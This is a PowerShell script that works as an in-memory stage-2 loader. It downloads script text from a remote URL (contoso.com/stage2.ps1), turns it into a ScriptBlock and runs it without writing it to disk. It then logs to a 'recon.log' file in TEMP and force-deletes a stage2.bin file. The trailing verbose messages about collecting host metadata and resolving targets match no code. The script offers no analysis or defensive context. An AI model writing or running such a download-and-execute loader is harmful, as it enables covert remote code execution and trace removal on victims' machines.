
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://contoso.com/stage2.ps1",
    [string]$LogPath = "$env:TEMP\recon.log",
    [int]$TimeoutSec = 21
)
$ErrorActionPreference = "Stop"

function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 21
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ''
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

try {
    Write-Verbose "Starting in-memory stage"
    $ScriptText = Get-StageScriptText -SourceUrl $RemoteUrl -TimeoutSec $TimeoutSec
    $TransferResult = Invoke-Stage2Script -ScriptBody $ScriptText
    Write-Verbose "Stage result: $($TransferResult)"
}
catch {
    Write-Warning "In-memory loader failed: $($_.Exception.Message)"
}

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $RemoteUrl
    ScriptLength = $ScriptText.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Operation completed"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Collecting host metadata"
Write-Verbose "Applying operation timeout"
Write-Verbose "Starting workflow"
Write-Verbose "Stage handoff finished"
Write-Verbose "Validating result"
Write-Verbose "Resolving configured target"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Exporting operation report"
Write-Verbose "Reading configuration values"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
